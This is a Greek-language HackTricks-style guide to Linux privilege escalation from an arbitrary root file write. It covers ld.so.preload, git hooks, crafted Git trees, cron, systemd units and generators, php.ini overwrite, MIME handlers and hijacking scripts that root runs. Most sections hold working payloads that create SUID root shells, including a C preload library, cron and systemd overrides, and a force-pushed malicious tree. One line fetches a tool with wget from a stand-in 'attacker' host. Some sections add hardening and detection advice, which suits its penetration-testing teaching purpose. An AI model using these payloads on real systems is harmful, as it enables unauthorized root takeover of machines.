# Εγγραφή Αυθαίρετου Αρχείου ως Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Το `/etc/ld.so.preload` είναι μια λίστα σε επίπεδο συστήματος με shared objects, τα οποία ο dynamic linker φορτώνει πριν από τα υπόλοιπα shared objects. Η λειτουργία secure-execution εφαρμόζει πρόσθετους περιορισμούς στο preloading, επομένως μια διαδρομή βιβλιοθήκης όπως η `/tmp/pe.so` δεν αποτελεί καθολική τεχνική για SUID-binary.\
Αν μπορείτε να δημιουργήσετε ή να τροποποιήσετε αυτό το αρχείο, μια διεργασία που το φορτώνει θα φορτώσει την καταχωρισμένη βιβλιοθήκη πριν από τα υπόλοιπα shared objects της, επιτρέποντας την εκτέλεση κώδικα στο πλαίσιο της συγκεκριμένης διεργασίας.<sup>[[12]](#references)</sup>

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

Τα **Git hooks** είναι εκτελέσιμα scripts που εκτελούνται σε συμβάντα ενός repository, όπως οι λειτουργίες commit και merge. Αν ένα **privileged script ή user** εκτελεί αυτές τις ενέργειες και ένας attacker μπορεί να **γράψει στον φάκελο `.git`**, το hook μπορεί να χρησιμοποιηθεί για **privilege escalation**.<sup>[[13]](#references)</sup>

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo, μέσα στο **`.git/hooks`**, ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal κατά την εξαγωγή Git tree με προνόμια

Ένας synchronizer με αυξημένα προνόμια μπορεί να παρακάμπτει το checkout και, αντί γι’ αυτό, να απαριθμεί ένα repository που επηρεάζεται από attacker με `git ls-tree`, να διαβάζει κάθε blob με `git cat-file`, να συνενώνει το αναφερόμενο pathname με έναν κατάλογο staging και να γράφει ο ίδιος τα δεδομένα. Αυτό οδηγεί σε **αυθαίρετη εγγραφή αρχείων με τα προνόμια του synchronizer**, όταν συνδυάζει το `-c safe.directory=*` (απενεργοποιώντας τον έλεγχο του Git για repository που ανήκει σε διαφορετικό χρήστη) με την απουσία ελέγχου περιορισμού του προορισμού. Ένα απόλυτο όνομα tree-entry κάνει την Python `os.path.join(stage, name)` να αγνοήσει το `stage`· ένα σχετικό όνομα που περιέχει `../` διαφεύγει όταν το filesystem επιλύσει τη διαδρομή. Επειδή η εφαρμογή υλοποιεί το raw tree αντί να ζητά από το Git να κάνει checkout, η απόρριψη pathname κατά το checkout δεν προστατεύει ποτέ το σημείο εγγραφής.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Αναζητήστε αυτό το μοτίβο κώδικα σε root services, timers, deployment agents, template importers και εργασίες backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Μια εγγραφή tree κωδικοποιείται ως `<mode> SP <name> NUL <raw object ID>`. Η επιλογή `git hash-object --literally` επιτρέπει σκόπιμα δεδομένα αντικειμένου που μπορεί να απορρίψει η κανονική ανάλυση ή το `git fsck`, επομένως ένα προσωρινό clone μπορεί να δημιουργήσει ένα tree με όνομα αρχείου που είναι απόλυτη διαδρομή προορισμού. Αυτό το παράδειγμα δημιουργεί ένα blob αρχείου cron, το περικλείει σε ένα commit και μετακινεί ένα branch σε αυτό· για την εκμετάλλευση εξακολουθεί να απαιτείται δικαίωμα ενημέρωσης ενός repository που χρησιμοποιεί η προνομιούχα εργασία, καθώς και ένας Git server που αποδέχεται το κακοσχηματισμένο αντικείμενο.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Η σκλήρυνση πρέπει να καλύπτει τόσο την εισαγωγή repository όσο και την τελική λειτουργία στο filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Αντικαταστήστε το `safe.directory=*` με τα ακριβή repositories που πρέπει να εμπιστεύεται η υπηρεσία και, όπου είναι δυνατό, εκτελέστε την επεξεργασία repository χωρίς προνόμια root.
- Απορρίψτε απόλυτα ονόματα και κάθε στοιχείο `.` ή `..` πριν από την υλοποίηση. Μετά την ένωση των διαδρομών, κανονικοποιήστε τη διαδρομή και επαληθεύστε ότι ο προορισμός παραμένει κάτω από τον προβλεπόμενο ριζικό κατάλογο.
- Αποφύγετε τις συνθήκες ανταγωνισμού symlink μεταξύ ελέγχου και ανοίγματος: ανοίξτε σε σχέση με έναν έμπιστο file descriptor καταλόγου και, στο Linux, χρησιμοποιήστε `openat2()` με `RESOLVE_BENEATH` και `RESOLVE_NO_SYMLINKS` για διαδρομές που ελέγχονται από επιτιθέμενο.
- Προτιμήστε ένα κανονικό checkout σε απομονωμένο κατάλογο αντί να επανυλοποιήσετε το checkout από έξοδο plumbing. Αν απαιτείται εισαγωγή raw-object, ενεργοποιήστε την επικύρωση στην πλευρά λήψης, όπως `receive.fsckObjects=true`· μην υποβαθμίζετε τα ευρήματα `receive.fsck.*` που σχετίζονται με ονόματα διαδρομών και είναι απαραίτητα για την απόρριψη κακόβουλα διαμορφωμένων trees.

### Ανάπτυξη προνομιακών ρυθμίσεων

Ορισμένες υπηρεσίες διαχείρισης αποθηκεύουν την προβλεπόμενη κατάσταση του συστήματος σε ένα αρχείο ρυθμίσεων και αργότερα την αναπτύσσουν με αυξημένα προνόμια. Για παράδειγμα, το [openmediavault stores configuration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), ενώ το [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) μπορεί να εφαρμόσει αλλαγές υπηρεσιών. Αν ένας λογαριασμός με χαμηλότερα προνόμια μπορεί να γράψει ή να αντικαταστήσει αυτό το αρχείο, ελέγξτε αν μπορεί επίσης να ζητήσει εξουσιοδοτημένη ανάπτυξη και αν η επιλεγμένη μονάδα χρησιμοποιεί ως root το τροποποιημένο πεδίο. Τα κλειδιά λογαριασμών SSH, οι προγραμματισμένες εντολές και η εγκατάσταση πακέτων έχουν διαφορετικές προϋποθέσεις· η απλή παρουσία ενός αρχείου ή ένα εγγράψιμο αρχείο XML δεν αποδεικνύει κανένα από αυτά. Ελέγξτε τα δικαιώματα του αρχείου και του γονικού καταλόγου, τις ομάδες του καλούντος και την εξουσιοδότησή του στο RPC, την εγκατεστημένη έκδοση και τον πραγματικό καταναλωτή, χωρίς να τροποποιήσετε τις ρυθμίσεις ή να εκτελέσετε ενέργεια εφαρμογής κατά την απογραφή.

Οι ορισμοί ενεργειών του Fail2Ban στο `/etc/fail2ban/action.d/` αποτελούν ένα ακόμη όριο προνομιακών ρυθμίσεων. Ένας χρήστης που μπορεί να γράψει και να αναζητήσει σε αυτόν τον κατάλογο ενδέχεται να μπορεί να αντικαταστήσει έναν ορισμό ενέργειας ή να προσθέσει μια παράκαμψη, αλλά τα δικαιώματα καταλόγου από μόνα τους δεν αποδεικνύουν εκτέλεση κώδικα. Επιβεβαιώστε ότι μια ενεργοποιημένη jail επιλέγει πράγματι την επηρεαζόμενη ενέργεια, ότι η υπηρεσία Fail2Ban την εκτελεί με υψηλότερα προνόμια και ότι θα πραγματοποιηθεί εξουσιοδοτημένη επαναφόρτωση/επανεκκίνηση μαζί με ένα συμβάν ban που την ενεργοποιεί. Μια άσχετη άδεια sudo για επανεκκίνηση του Fail2Ban έχει σημασία μόνο αν αφορά ακριβώς την κλήση της υπηρεσίας και φορτώνεται ο τροποποιημένος ορισμός. Το [Fail2Ban's action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) τεκμηριώνει τη σχέση μεταξύ του καταλόγου ενεργειών και των jail· το [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) δείχνει ότι το `actionban` εκτελείται κατά το ban με τα δικαιώματα του χρήστη της υπηρεσίας. Ελέγξτε τα δικαιώματα και την ενεργό διαμόρφωση χωρίς να αλλάξετε ενέργειες ή να προκαλέσετε ban κατά την απογραφή.

Ένα ξεχωριστό όριο υπάρχει όταν μια ενεργοποιημένη jail του Fail2Ban χρησιμοποιεί ενέργεια mail εμπλουτισμένη με WHOIS. Το [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) αφορούσε μη έμπιστο κείμενο WHOIS που διοχετευόταν στο GNU mailutils `mail`, του οποίου η επεξεργασία escape μπορούσε να εκτελέσει μια εντολή. Ένας χρήστης με χαμηλότερα προνόμια που μπορεί να γράψει αρχεία ενδέχεται να επηρεάσει την απόκριση, αν μπορεί να αλλάξει τις ρυθμίσεις παράκαμψης διακομιστή του **επιλεγμένου προγράμματος-πελάτη WHOIS**· το [Debian's `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) τεκμηριώνει ένα τέτοιο αρχείο, αλλά η διαδρομή και η χρήση του διαφέρουν ανά εγκατάσταση. Ελέγξτε την ενεργή jail/ενέργεια, την ταυτότητα υπηρεσίας, το πραγματικό πρόγραμμα-πελάτη WHOIS και τη διαδρομή ρυθμίσεών του, την υλοποίηση mail, τη δυνατότητα ελέγχου της απόκρισης και την εγκατεστημένη διόρθωση ή backport του προμηθευτή. Ένα εγγράψιμο αρχείο ρυθμίσεων WHOIS, μια έκδοση του Fail2Ban ή μια ενέργεια mail από μόνα τους δεν αποδεικνύουν αυτή την αλυσίδα· αποφύγετε ερωτήματα σε εξωτερικό διακομιστή ή την πρόκληση ban κατά την παθητική απογραφή.

### Δημιουργία αρχείων TFTP και προνομιακά hooks πακέτων

Μια προσβάσιμη υπηρεσία TFTP μπορεί να παραβιάσει το όριο ενός container ή ενός τοπικού χρήστη, όταν οι **ενεργές** ρυθμίσεις του tftpd-hpa εκτελούνται ως root, εκθέτουν τη ρίζα του filesystem ως κατάλογο `--secure` και ενεργοποιούν το `--create`. Το [The tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) περιγράφει τις επιλογές δημιουργίας και χρήστη. Αυτό μπορεί να επιτρέψει τη δημιουργία νέου αρχείου σε προνομιακό κατάλογο ρυθμίσεων, συμπεριλαμβανομένου του `/etc/apt/apt.conf.d/`· ένα υπάρχον αρχείο ενδέχεται και πάλι να μην μπορεί να αντικατασταθεί. Το [APT's configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) τεκμηριώνει τις εντολές `APT::Update::Pre-Invoke`. Μια εκτέλεση του `apt update` ως root μπορεί να γίνει ο καταναλωτής με τα υψηλότερα προνόμια **μόνο αν** διαβάσει το νέο αρχείο ρυθμίσεων. Επιβεβαιώστε τα πραγματικά ορίσματα και την ταυτότητα της εκτελούμενης υπηρεσίας, την προσβασιμότητα και το φιλτράρισμα του δικτύου, την πολιτική δημιουργίας στον κατάλογο-στόχο, το ενεργό εύρος ρυθμίσεων του APT και μια μεταγενέστερη προνομιακή εκτέλεση. Ένα προεπιλεγμένο αρχείο, ένας εγγράψιμος κατάλογος-στόχος ή μια προγραμματισμένη εντολή APT από μόνα τους δεν αποδεικνύουν ολόκληρη τη διαδρομή. Η παθητική αρχική διερεύνηση πρέπει να διαβάζει μόνο τοπικές ρυθμίσεις και μεταδεδομένα περιορισμένου μεγέθους, χωρίς αποστολή αρχείου ή εκτέλεση του APT.

### Αρχεία Cron και ώρας

Αν μπορείτε να **γράψετε σε αρχεία σχετικά με το cron που εκτελεί το root**, συνήθως μπορείτε να πετύχετε εκτέλεση κώδικα την επόμενη φορά που θα εκτελεστεί η εργασία. Ενδιαφέροντες στόχοι περιλαμβάνουν:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του root στο `/var/spool/cron/` ή στο `/var/spool/cron/crontabs/`
- `systemd` timers και οι υπηρεσίες που ενεργοποιούν

Γρήγοροι έλεγχοι:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Συνήθεις διαδρομές κατάχρησης:

- **Προσθήκη νέας cron job για root** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικατάσταση ενός script** που εκτελείται ήδη από το `run-parts`
- **Backdoor σε υπάρχοντα timer target** με τροποποίηση του script ή του binary που εκκινεί

Ελάχιστο παράδειγμα cron payload:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Αν μπορείς να γράψεις μόνο μέσα σε έναν κατάλογο cron που χρησιμοποιείται από το run-parts, άφησε εκεί ένα εκτελέσιμο αρχείο:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Σημειώσεις:

- Το `run-parts` συνήθως αγνοεί ονόματα αρχείων που περιέχουν τελείες, οπότε προτιμήστε ονόματα όπως `backup` αντί για `backup.sh`.<sup>[[15]](#references)</sup>
- Ορισμένα συστήματα χρησιμοποιούν timers του `systemd` αντί για το κλασικό cron, αλλά η ιδέα της κατάχρησης είναι η ίδια: **τροποποιήστε αυτό που θα εκτελέσει αργότερα ο root**.<sup>[[20]](#references)</sup>

### Αρχεία Service & Socket

Αν μπορείτε να γράψετε **αρχεία μονάδων `systemd`** ή αρχεία στα οποία αυτά παραπέμπουν, ίσως μπορέσετε να εκτελέσετε κώδικα ως root, κάνοντας reload και restart της μονάδας ή περιμένοντας να ενεργοποιηθεί η υπηρεσία/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Ελέγξτε επίσης αν έχετε δικαίωμα εγγραφής και αναζήτησης στον ίδιο τον κατάλογο μονάδων του συστήματος, συμπεριλαμβανομένων των ACL: ένας χρήστης μπορεί να δημιουργήσει μια νέα μονάδα στο `/etc/systemd/system` ακόμα κι όταν δεν επιτρέπεται η ανάγνωση ή η εμφάνιση των περιεχομένων του καταλόγου. Αυτή η διαδρομή από μόνη της δεν εκκινεί τίποτα. Επιβεβαιώστε ότι ο διαχειριστής του συστήματος θα φορτώσει τη νέα μονάδα, ότι ο καλών έχει αποτελεσματική άδεια `systemctl start` ή `restart` με δυνατότητα εκτέλεσης ως root για το όνομά της (ή άλλη προνομιούχα διαδρομή ενεργοποίησης) και ότι η υπηρεσία εκτελείται με την προβλεπόμενη ταυτότητα. Μια υπάρχουσα μονάδα που έχει φορτωθεί και τροποποιηθεί στον δίσκο ενδέχεται να χρειάζεται `daemon-reload`. Η συμπεριφορά φόρτωσης διαφέρει για μια μονάδα με νέο όνομα. Εξετάστε τα ακριβή ορίσματα και τις εξαιρέσεις του sudo προτού θεωρήσετε επαρκή έναν κανόνα επανεκκίνησης με wildcard. Δείτε τη [διαδρομή αναζήτησης μονάδων του systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) και τη [σημασιολογία φόρτωσης και reload του systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Παρακάμψεις Drop-in στο `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binaries υπηρεσιών στα οποία παραπέμπουν τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Εγγράψιμες διαδρομές `EnvironmentFile=` που φορτώνονται από μια υπηρεσία root

Γρήγοροι έλεγχοι:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Συνήθεις διαδρομές κατάχρησης:

- **Αντικαταστήστε το `ExecStart=`** σε ένα service unit που ανήκει στον root και μπορείτε να τροποποιήσετε
- **Προσθέστε ένα drop-in override** με ένα κακόβουλο `ExecStart=` και διαγράψτε πρώτα την παλιά εντολή
- **Τοποθετήστε backdoor στο script/binary** που αναφέρεται ήδη από το unit
- **Καταλάβετε μια socket-activated υπηρεσία** τροποποιώντας το αντίστοιχο αρχείο `.service`, το οποίο ξεκινά όταν το socket λαμβάνει μια σύνδεση

Παράδειγμα κακόβουλου override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Τυπική ροή ενεργοποίησης:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Αν δεν μπορείτε να επανεκκινήσετε οι ίδιοι τις υπηρεσίες, αλλά μπορείτε να επεξεργαστείτε ένα socket-activated unit, ίσως αρκεί να **περιμένετε μια σύνδεση client** για να εκτελεστεί ως root η υπηρεσία με backdoor.<sup>[[17]](#references)</sup>

### Κατάλογοι systemd generator

Οι **System generators** είναι εκτελέσιμα αρχεία που εκκινούνται από τον system manager πριν φορτώσει τα unit files, τόσο κατά την εκκίνηση όσο και κατά την επαναφόρτωση της διαμόρφωσης. Επομένως, η δυνατότητα εγγραφής σε έναν κατάλογο system-generator (ή σε ένα υπάρχον εκτελέσιμο generator) παρέχει άμεσα τη δυνατότητα εκτέλεσης κώδικα ως root, κάτι που είναι εύκολο να παραβλεφθεί όταν ένας έλεγχος εξετάζει μόνο αρχεία `*.service` και `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Η συνήθης σειρά αναζήτησης είναι `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` και `/usr/lib/systemd/system-generators/` (ορισμένες διανομές εκθέτουν το `/lib/systemd/system-generators/` μέσω της συγχώνευσης `/usr`). Ένα εκτελέσιμο με το ίδιο όνομα σε έναν προηγούμενο κατάλογο υπερισχύει του επόμενου. Μην συγχέετε αυτούς τους **καταλόγους εκτελέσιμων εισόδου** με τους `/run/systemd/generator`, `/run/systemd/generator.early` και `/run/systemd/generator.late`, οι οποίοι περιέχουν προσωρινά unit output που παράγεται από generators.<sup>[[35]](#references)</sup>

Γρήγοροι έλεγχοι:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Μια νεοδημιουργημένη γεννήτρια πρέπει να έχει ορισμένο το εκτελέσιμο bit. Αν το write primitive ελέγχει τα bytes αλλά όχι το mode, στόχευσε μια ήδη εκτελέσιμη γεννήτρια· η περικοπή της επιτόπου συνήθως διατηρεί τα μεταδεδομένα της. Αν ο ίδιος ο κατάλογος είναι εγγράψιμος, δημιούργησε μια νέα εγγραφή και όρισέ την ως εκτελέσιμη.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Η εκτέλεση του `systemctl daemon-reload` στον **system** manager απαιτεί κατάλληλη εξουσιοδότηση, αλλά εκτελεί ξανά κάθε system generator· διαφορετικά, περιμένετε μια reload με αυξημένα προνόμια, μια λειτουργία πακέτου ή επανεκκίνηση. Οι κατάλογοι user-generator, όπως ο `~/.config/systemd/user-generators/`, εκτελούνται από τον user manager και **δεν παρέχουν από μόνοι τους πρόσβαση root**.<sup>[[35]](#references)</sup>

Για ενίσχυση της ασφάλειας και αναζήτηση απειλών, επαληθεύστε κάθε στοιχείο διαδρομής και ACL, όχι μόνο τα τελικά mode bits, δημιουργήστε baseline για τα hashes και την ιδιοκτησία των generators από τα πακέτα και ειδοποιηθείτε για δημιουργία, μετονομασία, αλλαγές περιεχομένου ή δικαιωμάτων σε όλους τους καταλόγους εισόδου των system-generator. Η παρακολούθηση της εγγραφής είναι σημαντική, επειδή ένας one-shot generator μπορεί να διαγραφεί μετά την εκτέλεσή του, ενώ το δέντρο generated unit κάτω από το `/run/systemd/generator*` αναδημιουργείται στο επόμενο reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Αντικατάσταση ενός περιοριστικού `php.ini` που χρησιμοποιείται από προνομιούχο PHP sandbox

Ορισμένοι προσαρμοσμένοι daemons επικυρώνουν PHP που παρέχεται από τον χρήστη εκτελώντας το `php` με ένα **περιοριστικό `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Αν ο κώδικας στο sandbox εξακολουθεί να έχει **οποιοδήποτε primitive εγγραφής** (όπως το `file_put_contents`) και μπορείτε να αποκτήσετε πρόσβαση στην **ακριβή διαδρομή `php.ini`** που χρησιμοποιεί ο daemon, μπορείτε να **αντικαταστήσετε αυτό το config** για να άρετε τους περιορισμούς και, στη συνέχεια, να υποβάλετε ένα δεύτερο payload που εκτελείται με αυξημένα προνόμια.<sup>[[2]](#references)</sup>

Τυπική ροή:

1. Το πρώτο payload αντικαθιστά το config του sandbox.
2. Το δεύτερο payload εκτελεί κώδικα, τώρα που έχουν ενεργοποιηθεί ξανά οι επικίνδυνες συναρτήσεις.

Ελάχιστο παράδειγμα (αντικαταστήστε τη διαδρομή που χρησιμοποιεί ο daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Αν ο daemon εκτελείται ως root (ή επικυρώνει χρησιμοποιώντας paths που ανήκουν στον root), η δεύτερη εκτέλεση αποκτά context root. Πρόκειται ουσιαστικά για **privilege escalation via config overwrite**, όταν το sandboxed runtime εξακολουθεί να μπορεί να γράφει αρχεία.

### binfmt_misc

Το `binfmt_misc` εκθέτει τις καταχωρίσεις του στο `/proc/sys/fs/binfmt_misc`· κάθε καταχώριση συσχετίζει ένα μοτίβο τύπου αρχείου με έναν interpreter. Ο αντίκτυπος στα privileges εξαρτάται από το ποιος μπορεί να αλλάξει την καταχώριση και ποια διεργασία εκτελεί στη συνέχεια το αρχείο που ταιριάζει, επομένως επαληθεύστε αυτές τις προϋποθέσεις προτού θεωρήσετε ότι πρόκειται για διαδρομή privilege escalation.<sup>[[21]](#references)</sup>

Ένα εκτελέσιμο helper με `CAP_DAC_OVERRIDE` μπορεί να αποτελέσει ξεχωριστή διαδρομή καταχώρισης, αν δέχεται δεδομένα ελεγχόμενα από τον καλούντα και τα γράφει στο `/proc/sys/fs/binfmt_misc/register`, ακόμη κι όταν ο καλών δεν μπορεί να γράψει απευθείας σε αυτό το node. Ελέγξτε τη συμπεριφορά του helper ως προς την είσοδο και την εγγραφή, χωρίς να το εκτελέσετε κατά την απαρίθμηση. Αν ένας καταχωρισμένος κανόνας χρησιμοποιεί τη σημαία `C`, ο interpreter λαμβάνει credentials με βάση το δυαδικό αρχείο που ταιριάχτηκε· επομένως, ένα root-owned SUID αρχείο που ταιριάζει μπορεί να εκτελέσει interpreter ελεγχόμενο από τον καλούντα ως root. Επιβεβαιώστε το mount και την πολιτική καταχώρισης του `binfmt_misc`, την ενεργή capability του helper, τον ακριβή κανόνα και το path του interpreter, τον εκτελέσιμο στόχο SUID, καθώς και αν το `no_new_privs` ή ένα `nosuid` mount καταστέλλει τη μετάβαση SUID. Ένα bit capability ή ένα ενσωματωμένο path από μόνο του αποτελεί απλώς ένδειξη για περαιτέρω έλεγχο.<sup>[[21]](#references)</sup> Δείτε το [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) για τις συνθήκες καταστολής του SUID.

### Αντικατάσταση των handlers σχήματος (όπως http: ή https:)

Τα περιβάλλοντα επιφάνειας εργασίας χρησιμοποιούν συσχετίσεις MIME και desktop entries για να επιλέξουν εφαρμογή για τα URI schemes· ένας attacker που μπορεί να γράψει στους σχετικούς καταλόγους ρυθμίσεων ανά χρήστη και desktop entries μπορεί να ανακατευθύνει αυτά τα schemes σε launcher που ελέγχει. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list`, ώστε οι handlers URL HTTP και HTTPS να δείχνουν σε ένα κακόβουλο αρχείο (για παράδειγμα, `x-scheme-handler/http=evil.desktop` και `x-scheme-handler/https=evil.desktop`), ένα κλικ του χρήστη μπορεί να εκκινήσει αυτό το desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Εκτέλεση από root scripts/binaries που μπορούν να τροποποιηθούν από τον χρήστη

Αν μια privileged workflow εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε directory που ανήκει σε μη προνομιούχο χρήστη), μπορείς να το hijackάρεις:<sup>[[1]](#references)</sup>

- **Εντοπισμός της εκτέλεσης:** παρακολούθησε τις διεργασίες με το pspy για να εντοπίσεις το root να εκτελεί paths που ελέγχονται από χρήστες.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Επιβεβαίωση δυνατότητας εγγραφής:** βεβαιωθείτε ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν στον χρήστη σας ή είναι εγγράψιμα από αυτόν.
- **Υποκλοπή του στόχου:** δημιουργήστε αντίγραφο ασφαλείας του αρχικού binary/script και τοποθετήστε ένα payload που δημιουργεί ένα SUID shell (ή εκτελεί οποιαδήποτε άλλη ενέργεια ως root) και, στη συνέχεια, επαναφέρετε τα δικαιώματα:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Ενεργοποιήστε την privileged ενέργεια** (π.χ., πατώντας ένα κουμπί στο UI που ξεκινά το helper). Όταν το root εκτελέσει ξανά το hijacked path, αποκτήστε το escalated shell με `./rootshell -p`.

### Τροποποίηση privileged binaries μόνο στο page cache

Ορισμένα kernel bugs δεν τροποποιούν το αρχείο **στον δίσκο**. Αντί γι’ αυτό, σας επιτρέπουν να τροποποιήσετε μόνο το **αντίγραφο στο page cache** ενός αναγνώσιμου αρχείου. Αν στοχεύσετε ένα **setuid** ή άλλο binary που εκτελείται ως **root**, η επόμενη εκτέλεση μπορεί να εκτελέσει bytes που ελέγχει ο attacker από τη μνήμη και να κλιμακώσει τα προνόμια, παρόλο που το hash του αρχείου στον δίσκο παραμένει αμετάβλητο.<sup>[[3]](#references)[[4]](#references)</sup>

Είναι χρήσιμο να το σκεφτείτε ως **primitive εγγραφής αρχείου μόνο κατά το runtime**:<sup>[[3]](#references)</sup>

- **Ο δίσκος παραμένει καθαρός**: το inode και τα bytes στον δίσκο δεν αλλάζουν
- **Η μνήμη είναι αλλοιωμένη**: οι διεργασίες που διαβάζουν/εκτελούν τη cached page λαμβάνουν το περιεχόμενο που τροποποίησε ο attacker
- **Το αποτέλεσμα είναι προσωρινό**: η αλλαγή εξαφανίζεται μετά από reboot ή eviction από το cache

Αυτό το primitive βρίσκεται ανάμεσα στο κλασικό **arbitrary file write** και σε παλαιότερα bugs κατάχρησης του **page cache**, όπως τα Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη θέση εγγραφής
- Ένα primitive που λειτουργεί μόνο στο page cache μπορεί να είναι πιο αξιόπιστο, αν η ευάλωτη διαδρομή επιτρέπει απευθείας εγγραφές σε cached pages που υποστηρίζονται από αρχεία

#### Γενική ροή privesc

1. Αποκτήστε ένα kernel primitive που μπορεί να γράψει σε **pages του page cache που υποστηρίζονται από αρχεία**
2. Χρησιμοποιήστε το εναντίον ενός **αναγνώσιμου privileged binary** ή άλλου αρχείου που εκτελείται ως root
3. Ενεργοποιήστε την εκτέλεση **πριν το page γίνει evicted από το cache**
4. Αποκτήστε code execution ως root, ενώ το αρχείο στον δίσκο εξακολουθεί να φαίνεται αμετάβλητο

Τυπικοί στόχοι υψηλής αξίας:

- **setuid-root** binaries
